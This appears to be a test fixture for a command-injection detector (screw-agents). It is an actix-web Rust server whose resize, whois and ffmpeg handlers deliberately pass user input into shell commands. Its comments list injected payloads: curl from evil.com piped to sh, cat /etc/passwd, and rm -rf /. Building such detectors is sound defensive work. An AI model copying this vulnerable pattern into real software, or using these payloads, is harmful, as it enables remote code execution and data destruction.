// --- screw-agents smoke-test fixture (not for detection benchmarking) ---
// Per ADR-014 (docs/DECISIONS.md), Rust benchmark corpus is DEFERRED to Phase 5.
// This file verifies MCP plumbing + tree-sitter loading + agent-YAML resolution.
// Detection accuracy against this file is NOT part of any Phase 1 validation gate.
// Phase 5 corpus seed: docs/research/benchmark-tier4-rust-modern.md
// -----------------------------------------------------------------------
// Fixture: rust-actix-tokio-command — tokio::process::Command with shell
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-78
// Agent: cmdi
// Pattern: User input interpolated via format!() into async shell command

use actix_web::{web, App, HttpResponse, HttpServer};
use serde::{Deserialize, Serialize};
use tokio::process::Command;

#[derive(Deserialize)]
struct ResizeRequest {
    input_path: String,
    width: u32,
    height: u32,
}

#[derive(Serialize)]
struct ApiResponse {
    success: bool,
    message: String,
}

// VULNERABLE: user-controlled input_path in ImageMagick command via shell
// Attacker sends: {"input_path": "img.png\"; curl http://evil.com/x | sh; echo \"", "width": 800, "height": 600}
async fn resize_image(body: web::Json<ResizeRequest>) -> HttpResponse {
    let cmd = format!(
        "convert \"{}\" -resize {}x{} \"/tmp/resized_{}\"",
        body.input_path, body.width, body.height, body.input_path
    );
    let output = Command::new("sh")
        .arg("-c")
        .arg(&cmd)
        .output()
        .await
        .expect("failed to execute");

    if output.status.success() {
        HttpResponse::Ok().json(ApiResponse {
            success: true,
            message: "Image resized".to_string(),
        })
    } else {
        HttpResponse::InternalServerError().json(ApiResponse {
            success: false,
            message: String::from_utf8_lossy(&output.stderr).to_string(),
        })
    }
}

#[derive(Deserialize)]
struct WhoisQuery {
    domain: String,
}

// VULNERABLE: user-controlled domain in whois lookup via async shell
// Attacker sends: {"domain": "example.com; cat /etc/passwd"}
async fn whois_lookup(query: web::Query<WhoisQuery>) -> HttpResponse {
    let cmd = format!("whois {}", query.domain);
    let output = Command::new("sh")
        .arg("-c")
        .arg(&cmd)
        .output()
        .await
        .expect("failed to execute");

    HttpResponse::Ok().json(serde_json::json!({
        "domain": query.domain,
        "result": String::from_utf8_lossy(&output.stdout).to_string(),
    }))
}

#[derive(Deserialize)]
struct VideoRequest {
    input_url: String,
    format: String,
}

// VULNERABLE: user-controlled URL and format in ffmpeg command via shell
// Attacker sends: {"input_url": "http://vid.com/a.mp4\"; rm -rf / #", "format": "mp3"}
async fn convert_video(body: web::Json<VideoRequest>) -> HttpResponse {
    let output_path = format!("/tmp/converted_{}.{}", uuid::Uuid::new_v4(), body.format);
    let cmd = format!(
        "ffmpeg -i \"{}\" -y \"{}\"",
        body.input_url, output_path
    );
    let output = Command::new("bash")
        .arg("-c")
        .arg(&cmd)
        .output()
        .await
        .expect("failed to execute");

    HttpResponse::Ok().json(serde_json::json!({
        "success": output.status.success(),
        "output_path": output_path,
    }))
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| {
        App::new()
            .route("/api/resize", web::post().to(resize_image))
            .route("/api/whois", web::get().to(whois_lookup))
            .route("/api/convert", web::post().to(convert_video))
    })
    .bind("0.0.0.0:8080")?
    .run()
    .await
}
